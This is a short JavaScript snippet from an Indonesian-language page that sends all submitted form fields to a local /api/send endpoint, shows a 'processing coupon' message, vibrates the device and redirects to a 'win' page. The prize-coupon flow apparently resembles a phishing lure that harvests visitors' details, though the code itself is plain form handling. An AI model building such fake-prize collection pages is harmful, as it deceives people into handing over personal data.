<script>
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("formData");
  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    await fetch('/api/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      credentials: 'include',
      body: JSON.stringify(data)
    });

    vibr(180);
    setTimeout(() => {
      window.location.href = 'win.html';
    }, 3000);
  });
});
</script>
